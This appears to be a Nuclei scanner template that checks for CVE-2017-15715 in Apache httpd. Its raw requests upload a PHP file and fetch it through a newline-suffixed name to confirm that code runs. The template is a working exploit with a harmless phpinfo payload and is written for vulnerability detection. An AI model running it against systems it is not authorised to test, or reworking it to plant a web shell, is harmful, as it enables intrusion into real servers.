id: CVE-2017-15715

info:
  name: Apache Arbitrary File Upload
  author: geeknik
  description: In Apache httpd 2.4.0 to 2.4.29, the expression specified in <FilesMatch> could match '$' to a newline character in a malicious filename, rather than matching only the end of the filename. This could be exploited in environments where uploads of some files are are externally blocked, but only by matching the trailing portion of the filename.
  reference: https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715
  severity: high
  tags: cve,cve2017

requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip,deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: multipart/form-data;boundary=----------795556870
        Content-Length: 200

        ----------79556870
        Content-Disposition: form-data; name="name"

        nuclei.php
        ----------79556870
        Content-Disposition: form-data; name="file"; filename="nuclei.php"

        <?=phpinfo()?>
        ----------79556870

      - |
        GET /nuclei.php%0a HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: gzip,deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "PHP Version")'
          - 'contains(body_2, "PHP Extension")'
        condition: and
